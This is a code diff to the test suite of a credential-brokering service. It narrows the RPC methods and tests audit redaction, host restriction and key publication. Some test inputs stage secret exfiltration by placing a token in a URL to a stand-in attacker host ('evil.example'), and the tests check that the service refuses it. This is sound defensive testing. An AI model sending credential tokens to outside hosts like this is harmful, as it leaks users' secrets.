@@ -13,7 +13,6 @@ import time
 import httpx
 import pytest
 
-from secret_gate.crypto import b64url_decode
 from secret_gate.constants import KIND_TOTP, USE_EXEC, USE_FILL, USE_HTTP, USE_OTP
 from secret_gate.errors import GateError
 from secret_gate.keystore import load_public_key
@@ -54,55 +53,27 @@ def test_socket_is_0666_and_only_allowed_uids_get_an_answer():
         assert not svc.audit.exists()                                     # refused before any request was read
 
 
-def test_status_and_keys_methods_publish_and_signal_the_proxy():
+def test_the_socket_answers_exactly_the_methods_of_gate_simple_v0():
+    from secret_gate.rpc_methods import METHODS
+
+    assert METHODS == ("status", "refs.register", "refs.release", "mcp.describe", "mcp.otp", "mcp.http",
+                       "exec.resolve", "browser.register", "browser.config", "browser.resolve", "logs.tail")
+    with running_service() as svc:
+        assert svc.service.methods == METHODS
+        for gone in ("keys.list", "keys.new", "keys.use", "keys.retire", "keys.restore", "credential.info",
+                     "credential.reissue", "mcp.repair", "mcp.exec"):
+            with pytest.raises(RemoteError, match="未知方法"):
+                svc.client.call(gone, {})
+
+
+def test_status_lists_the_one_key_as_published():
     with running_service() as svc:
         status = svc.client.call("status")
         assert status["proxyPort"] == 18080 and status["runtimeVersion"] == "0.1.0+test" and status["proxyRunning"]
-        assert [k["name"] for k in status["keys"]] == ["main"]
-        row = svc.client.call("keys.new", {"name": "next", "use": True})
-        assert row["name"] == "next" and row["current"] and not row["legacy"]
-        assert svc.signals == ["HUP"]
         published = json.loads((svc.public / "keys.json").read_text())
-        assert [r["name"] for r in published if r["current"]] == ["next"]
-        assert svc.client.call("keys.use", {"name": "main"})["current"] is True
-        assert [k["name"] for k in svc.client.call("keys.list") if k["current"]] == ["main"]
-        with pytest.raises(RemoteError, match="exists"):
-            svc.client.call("keys.new", {"name": "main"})
-        with pytest.raises(RemoteError, match="未停用"):
-            svc.client.call("keys.retire", {"name": "next"})
-        with pytest.raises(RemoteError, match="参数无效"):
-            svc.client.call("keys.new", {"name": "x", "use": "yes"})
-        assert len(svc.signals) == 2
-
-
-def test_keys_new_stops_at_the_keypair_limit(monkeypatch):
-    from secret_gate.crypto import generate_keypair
-    from secret_gate.keystore import save_keypair
-
-    monkeypatch.setattr("secret_gate.rpc_methods.MAX_KEYPAIRS", 3)
-    with running_service() as svc:
-        save_keypair(svc.home / "keys" / "legacy" / "old", generate_keypair())   # legacy keys do not count
-        svc.client.call("keys.new", {"name": "two"})
-        svc.client.call("keys.new", {"name": "three"})
-        with pytest.raises(RemoteError, match="密钥对已达上限（3 个）"):
-            svc.client.call("keys.new", {"name": "four"})
-        assert not (svc.home / "keys" / "four").exists()
-        assert [k["name"] for k in svc.client.call("keys.list")] == ["main", "three", "two", "old"]
-        assert len(svc.signals) == 2
-
-
-def test_legacy_keys_over_the_socket():
-    from secret_gate.crypto import generate_keypair
-    from secret_gate.keystore import save_keypair
-
-    with running_service() as svc:
-        save_keypair(svc.home / "keys" / "legacy" / "old", generate_keypair())
-        with pytest.raises(RemoteError, match="已停用"):
-            svc.client.call("keys.use", {"name": "old"})
-        assert svc.client.call("keys.retire", {"name": "old"}) == {"retired": "old"}
-        assert [k["name"] for k in svc.client.call("keys.list")] == ["main"]
-        assert svc.client.call("keys.restore", {"name": "old"}) == {"restored": "old"}
-        assert [k["name"] for k in svc.client.call("keys.list")] == ["main", "old"]
+        assert status["keys"] == published
+        assert [(k["name"], k["current"], k["legacy"]) for k in published] == [("main", True, False)]
+        assert published[0]["publicKey"] == (svc.home / "key.pub").read_text().strip()
 
 
 def test_refs_register_and_release_match_the_cli_contract():
@@ -120,16 +91,38 @@ def test_refs_register_and_release_match_the_cli_contract():
             svc.client.call("refs.release", {"scope": "short"})
 
 
-def test_credential_info_and_reissue():
+def test_old_tokens_with_seed_import_hosts_still_open_and_the_field_is_ignored():
+    from secret_gate.crypto import encrypt, b64url_encode
+    from secret_gate.tokens import pad_plaintext
+
     with running_service() as svc:
-        totp = _token(svc, value=fs.TOTP_SECRET_B32, uses=(USE_OTP,), kind=KIND_TOTP, label="portal-a/totp",
-                      seed_import_hosts=["portal-a.example.com"])
-        info = svc.client.call("credential.info", {"token": totp})
-        assert info["kind"] == "totp" and info["seed_import_hosts"] == ["portal-a.example.com"]
-        out = svc.client.call("credential.reissue", {"token": totp, "host": "portal-a.example.com", "purpose": "totp_seed_import"})
-        assert out["uses"] == ["fill", "http"] and out["token"].startswith("enc:v1:") and fs.TOTP_SECRET_B32 not in json.dumps(out)
-        with pytest.raises(RemoteError, match="unexpected fields"):
-            svc.client.call("credential.info", {"token": totp, "extra": 1})
+        old = json.dumps({"v": fs.TOTP_SECRET_B32, "host": ["portal-a.example.com"], "use": ["otp"],
+                          "label": "portal-a/totp", "kind": "totp", "seed_import_hosts": ["portal-a.example.com"]})
+        token = "enc:v1:" + b64url_encode(encrypt(load_public_key(svc.home), pad_plaintext(old.encode())))
+        info = svc.client.call("mcp.describe", {"token": token})
+        assert info == {"label": "portal-a/totp", "kind": "totp", "hosts": ["portal-a.example.com"], "uses": ["otp"]}
+        assert svc.client.call("mcp.otp", {"token": token}).isdigit()
+
+
+def test_exec_resolve_hands_out_only_exec_tokens_and_audits_without_the_value():
+    with running_service() as svc:
+        exec_token = _token(svc, uses=(USE_EXEC,), hosts=(), label="db/pass")
+        assert svc.client.call("exec.resolve", {"token": exec_token}) == {"value": PASSWORD, "label": "db/pass"}
+        for uses in ((USE_HTTP,), (USE_FILL,), (USE_HTTP, USE_FILL)):
+            with pytest.raises(RemoteError, match="does not allow use 'exec'"):
+                svc.client.call("exec.resolve", {"token": _token(svc, uses=uses)})
+        ref = svc.client.call("refs.register", {"scope": SCOPE, "tokens": [exec_token]})["refs"][0]["ref"]
+        assert svc.client.call("exec.resolve", {"scope": SCOPE, "token": ref})["value"] == PASSWORD
+        with pytest.raises(RemoteError, match="no task scope"):
+            svc.client.call("exec.resolve", {"token": ref})
+        with pytest.raises(RemoteError, match="参数无效"):
+            svc.client.call("exec.resolve", {"token": exec_token, "host": "x"})
+        audit = svc.audit.read_text()
+        assert PASSWORD not in audit and exec_token not in audit and SCOPE not in audit
+        line = next(line for line in _audit(svc) if line["method"] == "exec.resolve" and line["ok"])
+        assert line["labels"] == ["db/pass"]
+        (svc.home / "logs" / "rpc.log").write_text(f"a library quoted {PASSWORD}\n")
+        assert PASSWORD not in svc.client.call("logs.tail", {"name": "rpc"})["text"]   # handed out: redacted from logs
 
 
 def test_mcp_methods_run_inside_the_service_and_redact():
@@ -139,18 +132,13 @@ def test_mcp_methods_run_inside_the_service_and_redact():
         seen.append(request)
         return httpx.Response(200, text=f"hello {request.content.decode()}")
 
-    def runner(argv, **kw):
-        return subprocess.CompletedProcess(argv, 0, stdout=f"ran with {kw['env']['V']}", stderr="")
-
     client = httpx.Client(transport=httpx.MockTransport(handler))
-    with running_service(http_client=lambda: client, exec_runner=runner) as svc:
-        (svc.home / "exec_templates.json").write_text(json.dumps({"echo": {"argv": ["/bin/echo"], "env": {"V": "{SECRET}"}}}))
+    with running_service(http_client=lambda: client) as svc:
         token = _token(svc, uses=(USE_HTTP, USE_EXEC))
         assert svc.client.call("mcp.describe", {"token": token})["label"] == "portal-a/pass"
         out = svc.client.call("mcp.http", {"method": "POST", "url": "https://portal-a.example.com/login", "body": token})
         assert seen[0].content.decode() == PASSWORD                        # the site got the value
         assert out == {"status": 200, "headers": out["headers"], "body": "hello [REDACTED:portal-a/pass]"}
-        assert svc.client.call("mcp.exec", {"template": "echo", "token": token})["stdout"] == "ran with [REDACTED:portal-a/pass]"
         with pytest.raises(RemoteError, match="not allowed on host"):
             svc.client.call("mcp.http", {"method": "GET", "url": f"https://evil.example/?p={token}"})
         totp = _token(svc, value=fs.TOTP_SECRET_B32, uses=(USE_OTP,), kind=KIND_TOTP, label="portal-a/totp")
@@ -179,25 +167,6 @@ def test_mcp_http_transport_errors_name_the_failure_only():
         assert str(exc.value) == "request failed (ConnectError)" and PASSWORD not in str(exc.value)
 
 
-def test_mcp_repair_goes_to_the_bridge_the_caller_names():
-    posted: list[dict] = []
-
-    def bridge(request: httpx.Request) -> httpx.Response:
-        body = json.loads(request.content)
-        posted.append({"auth": request.headers["authorization"], **body})
-        return httpx.Response(200, json={"ok": True, "token": body["token"], "label": "portal-a/totp", "kind": "secret",
-                                         "hosts": [body["host"]], "uses": ["fill", "http"]})
-
-    with running_service(repair_transport=httpx.MockTransport(bridge)) as svc:
-        token = _token(svc, value=fs.TOTP_SECRET_B32, uses=(USE_OTP,), kind=KIND_TOTP, label="portal-a/totp")
-        params = {"token": token, "host": "portal-a.example.com"}
-        with pytest.raises(RemoteError, match="outside an active dispatcher task"):
-            svc.client.call("mcp.repair", params)
-        out = svc.client.call("mcp.repair", {**params, "repairUrl": "http://127.0.0.1:4799/credential-repair",
-                                             "repairKey": "k" * 24})
-        assert out["label"] == "portal-a/totp" and posted[0]["auth"] == "Bearer " + "k" * 24
-
-
 def test_browser_resolve_is_fill_only_and_host_checked():
     with running_service() as svc:
         fill = _token(svc, uses=(USE_FILL,), label="portal-a/fill")
@@ -215,23 +184,6 @@ def test_browser_resolve_is_fill_only_and_host_checked():
         assert svc.client.call("browser.resolve", {"scope": SCOPE, "token": ref, "host": host})["value"] == PASSWORD
         line = next(line for line in _audit(svc) if line["method"] == "browser.resolve" and line["ok"])
         assert line["host"] == host and line["labels"] == ["portal-a/fill"] and PASSWORD not in svc.audit.read_text()
-
-
-def test_browser_resolve_lets_http_tokens_of_moved_in_keys_be_typed_but_not_new_ones():
-    # gate-service-v0 §1: a key moved in from the login user's home was readable there, so an http token sealed to it
-    # is typed as before; tokens sealed to keys made in the service need 'fill' to leave it for the browser.
-    with running_service(keys=("main", "old")) as svc:
-        (svc.home / "keys" / "legacy").mkdir(mode=0o700)
-        (svc.home / "keys" / "old").rename(svc.home / "keys" / "legacy" / "old")
-        legacy_pub = b64url_decode((svc.home / "keys" / "legacy" / "old" / "key.pub").read_text().strip())
-        payload = SecretPayload.create(value=PASSWORD, hosts=list(fs.PORTAL.hosts), uses={USE_HTTP}, label="portal-a/old", kind="secret")
-        old_http = make_token(legacy_pub, payload)
-        host = "login.portal-a.example.com:443"
-        assert svc.client.call("browser.resolve", {"token": old_http, "host": host})["value"] == PASSWORD
-        with pytest.raises(RemoteError, match="not allowed on host"):
-            svc.client.call("browser.resolve", {"token": old_http, "host": "evil.example:443"})
-        with pytest.raises(RemoteError, match="does not allow use 'fill'"):
-            svc.client.call("browser.resolve", {"token": _token(svc, uses=(USE_HTTP,)), "host": host})
 
 
 def test_browser_config_and_logs_tail():
@@ -281,24 +233,24 @@ def test_a_slow_call_does_not_hold_up_other_clients():
     release = threading.Event()
     started = threading.Event()
 
-    def slow_runner(argv, **_kw):
+    def slow_site(_request: httpx.Request) -> httpx.Response:
         started.set()
         release.wait(10)
-        return subprocess.CompletedProcess(argv, 0, stdout="done", stderr="")
+        return httpx.Response(200, text="done")
 
-    with running_service(exec_runner=slow_runner) as svc:
-        (svc.home / "exec_templates.json").write_text(json.dumps({"slow": {"argv": ["/bin/true"], "stdin": "{SECRET}"}}))
-        token = _token(svc, uses=(USE_EXEC,))
+    client = httpx.Client(transport=httpx.MockTransport(slow_site))
+    with running_service(http_client=lambda: client) as svc:
         results: list = []
-        worker = threading.Thread(target=lambda: results.append(svc.client.call("mcp.exec", {"template": "slow", "token": token})))
+        worker = threading.Thread(target=lambda: results.append(
+            svc.client.call("mcp.http", {"method": "GET", "url": "https://portal-a.example.com/"})))
         worker.start()
         assert started.wait(5)
         began = time.monotonic()
-        assert svc.client.call("status")["version"]                        # answered while exec is still running
+        assert svc.client.call("status")["version"]                        # answered while the site is still slow
         assert time.monotonic() - began < 2 and not results
         release.set()
         worker.join(5)
-        assert results[0]["stdout"] == "done"
+        assert results[0]["body"] == "done"
 
 
 def test_stale_socket_is_replaced_but_a_live_one_or_a_file_is_not():
@@ -323,18 +275,17 @@ def test_no_service_means_unavailable_never_a_local_fallback(tmp_path):
 
 
 def test_secret_gate_rpc_process_end_to_end():
-    """`secret-gate rpc` as launchd runs it: env only, config next to the public dir, SIGTERM removes the socket."""
+    """`secret-gate rpc` as launchd runs it: env only, config next to the public dir, SIGTERM removes the socket.
+    A home without a keypair gets one at start (a fresh install; gate-simple-v0 §6)."""
     import signal
     import sys
 
-    from secret_gate.keyring import create_keypair
     from secret_gate.service_paths import ServiceConfig
 
     with short_dir() as root:
         home, public = root / "gate", root / "gate-public"
         home.mkdir(mode=0o700)
         public.mkdir()
-        create_keypair(home, "main")
         config = ServiceConfig(owner_uid=os.getuid(), proxy_port=18081, runtime_version="t", installed_at="t")
         (root / "gate-service.json").write_text(json.dumps(config.to_json()))
         env = {**os.environ, "SECRET_GATE_HOME": str(home), "SECRET_GATE_PUBLIC": str(public)}
@@ -347,13 +298,15 @@ def test_secret_gate_rpc_process_end_to_end():
                 time.sleep(0.05)
             status = RpcClient(public / "gate.sock").call("status")
             assert status["proxyPort"] == 18081 and status["proxyRunning"] is False
-            assert json.loads((public / "keys.json").read_text())[0]["name"] == "main"
+            rows = json.loads((public / "keys.json").read_text())
+            assert [r["name"] for r in rows] == ["main"] and rows[0]["publicKey"] == (home / "key.pub").read_text().strip()
+            assert stat.S_IMODE((home / "key.priv").stat().st_mode) == 0o600
         finally:
             proc.send_signal(signal.SIGTERM)
             _, err = proc.communicate(timeout=10)
         assert proc.returncode == 0, err
         assert not (public / "gate.sock").exists()
-        assert b"listening on" in err
+        assert b"listening on" in err and b"generated one" in err
 
 
 def test_allowed_uids_come_from_gate_service_json(tmp_path, capsys):
